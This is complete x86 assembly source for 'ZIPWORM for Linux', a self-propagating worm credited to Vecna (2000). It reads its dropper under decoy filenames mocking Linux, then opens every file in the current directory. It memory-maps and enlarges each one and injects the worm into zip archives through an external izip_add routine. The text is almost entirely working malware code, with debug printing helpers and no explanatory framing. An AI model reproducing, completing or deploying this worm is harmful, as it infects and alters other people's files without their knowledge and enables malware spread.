   ;ZIPWORM for Linux
   ;(c) Vecna 2000

   BITS 32

   ;%define DEBUG 1

   global main
   extern izip_add
   extern izip_maxaddsize

   [section .data]
              db "elf zip worm vecna", 0
   nametable  dd name01
              dd name02
              dd name03
              dd name04
              dd name05
   dot        db ".",0
   name01     db "Ten motives why linux sux!",0
   name02     db "Why Windows is superior to Linux!",0
   name03     db "Is Linux for you? Never!",0
   name04     db "Is Linux immune to virus? NO!",0
   name05     db "zipworm!",0
   %ifdef DEBUG
   deb_msg0   times 80 db "-"
   deb_msg4   db 0dh,0ah,0
   deb_msg1   db "Running...",0dh,0ah,0
   deb_msg2   db "Exiting to OS",0dh,0ah,0
   deb_msg3   db "Opening: ",0
   deb_msg5   db "Found worm!",0dh,0ah,0
   deb_msg6   db "Worm size: ",0
   deb_msg7   db "File search done",0dh,0ah,0
   deb_msg8   db "File search init",0dh,0ah,0
   deb_msg9   db "Worm in mem!",0dh,0ah,0
   deb_msg10  db "Add size: ",0
   %endif

   mapstruct  dd 0
   mapsize    dd 0
              dd 3
              dd 1
   mapfilehnd dd 0
              dd 0

   [section .bss]
   hostptr    resd 1
   hostsize   resd 1
   addsize    resd 1
   orgsize    resd 1
   dir_entry  resb 0110h
   hostbuffer resb 4000h

   [section .text]
   main:
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg1
          call write_console
          popad
   %endif
          cld
          push byte 5
          mov esi, nametable
          pop ecx
     .trynextname:
          push ecx
          lodsd
          mov ebx, eax
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg3
          call write_console
          mov ecx, ebx
          call write_console
          mov ecx, deb_msg4
          call write_console
          popad
   %endif
          sub ecx, ecx
          push byte 5h
          pop eax
          cdq
          int 80h
          mov ebx, eax
          test eax, eax
          pop ecx
          jns .foundhost
          loop .trynextname
          jmp .exit
     .foundhost:
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg5
          call write_console
          popad
   %endif
          cmp esi, dot
          jb .no_name_adj
          mov esi, nametable
     .no_name_adj:
          push byte 13h
          push byte 2h
          sub ecx, ecx
          pop edx
          pop eax
          int 80h
          mov [hostsize], eax
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg6
          call write_console
          mov eax, eax
          call write_dword
          popad
   %endif
          push byte 13h
          sub ecx, ecx
          pop eax
          cdq
          int 80h
          mov ecx, hostbuffer
          mov edx, [hostsize]
          push byte 3
          pop eax
          int 80h                                  ;read dropper
          push byte 6
          pop eax
          int 80h                                  ;close file
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg9
          call write_console
          popad
   %endif
          push dword [esi]
          push dword [hostsize]
          call izip_maxaddsize       ;eax=size to increase .zip
          mov [addsize], eax
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg10
          call write_console
          mov eax, eax
          call write_dword
          popad
   %endif
          push byte 5
          mov ebx, dot
          sub ecx, ecx
          pop eax
          cdq
          int 80h
          mov ebx, eax                             ;open current dir
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg8
          call write_console
          popad
   %endif
     .next_entry:
          push byte 59h
          mov ecx, dir_entry
          pop eax
          int 80h                                  ;read directory entry
          test eax, eax
          jz near .done
          pushad
          lea ebx, [dir_entry+0ah]
          movzx eax, word [dir_entry+8h]
          cdq
          mov dword [ebx+eax+1], edx                 ;put 0 marker
          push byte 2
          push byte 5h
          pop eax
          pop ecx
   %ifdef DEBUG
          pushad
          mov ecx, ebx
          call write_console
          mov ecx, deb_msg4
          call write_console
          popad
   %endif
          int 80h
          test eax, eax
          js near .search_next
          mov [mapfilehnd], eax
          mov ebx, eax

          push byte 13h
          push byte 2h
          sub ecx, ecx
          pop edx
          pop eax
          int 80h
          mov [orgsize], eax
          mov edi, eax
          add eax, [addsize]
          mov [mapsize], eax

          push byte 93
          mov ecx, eax
          pop eax
          int 80h

          push byte 90
          mov ebx, mapstruct
          pop eax
          int 80h
          cmp eax, 0fffff000h
          ja .closehandle
          mov ebx, eax

          push edi
          push eax
          push dword [esi]
          push dword [hostsize]
          mov eax, hostbuffer
          push eax
          call izip_add
          test eax, eax
          jz .clean
          add [orgsize], eax
     .clean:
          push byte 91
          pop eax
          int 80h

          push byte 93
          mov ecx, [orgsize]
          mov ebx, [mapfilehnd]
          pop eax
          int 80h

     .closehandle:
          push byte 6
          mov ebx, [mapfilehnd]
          pop eax
          int 80h                                  ;close file

     .search_next:
          popad
          jmp .next_entry

     .done:
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg7
          call write_console
          popad
   %endif

     .exit:
   %ifdef DEBUG
          pushad
          mov ecx, deb_msg2
          call write_console
          popad
   %endif
          push byte 1
          sub ebx, ebx
          pop eax
          int 80h


   %ifdef DEBUG
   ;ecx=string
   write_console:
          pushad
          push byte -1
          mov edx, ecx
          mov esi, ecx
          pop ecx
     .count:
          inc ecx
          lodsb
          test al, al
          jnz .count
          xchg ecx, edx
          push byte 4
          push byte 1
          pop ebx
          pop eax
          int 80h
          popad
          ret
   %endif


   %ifdef DEBUG
   ;eax=dword
   write_dword:
          pushad
          sub esp, 32
          mov edi, esp
          push byte 8
          pop ecx
     .hexchar:
          rol eax, 4
          push eax
          and eax, 01111b
          call .table
          db "0123456789ABCDEF",0
     .table:
          pop ebx
          xlatb
          stosb
          pop eax
          loop .hexchar
          mov eax, 0d0ah
          stosd
          mov ecx, esp
          call write_console
          add esp, 32
          popad
          ret
   %endif


   %ifdef DEBUG
   output_registers:
          pushad
          mov ecx, deb_msg0
          call write_console
          call .0001
          db "EAX=", 0
     .0001:
          pop ecx
          call write_console
          mov eax, eax
          call write_dword
          call .0002
          db "EBX=", 0
     .0002:
          pop ecx
          call write_console
          mov eax, ebx
          call write_dword
          call .0003
          db "ECX=", 0
     .0003:
          pop ecx
          call write_console
          mov eax, ecx
          call write_dword
          call .0004
          db "EDX=", 0
     .0004:
          pop ecx
          call write_console
          mov eax, edx
          call write_dword
          call .0005
          db "ESP=", 0
     .0005:
          pop ecx
          call write_console
          mov eax, esp
          call write_dword
          call .0006
          db "EBP=", 0
     .0006:
          pop ecx
          call write_console
          mov eax, ebp
          call write_dword
          call .0007
          db "ESI=", 0
     .0007:
          pop ecx
          call write_console
          mov eax, esi
          call write_dword
          call .0008
          db "EDI=", 0
     .0008:
          pop ecx
          call write_console
          mov eax, edi
          call write_dword
          mov ecx, deb_msg0
          call write_console
          popad
          ret
   %endif
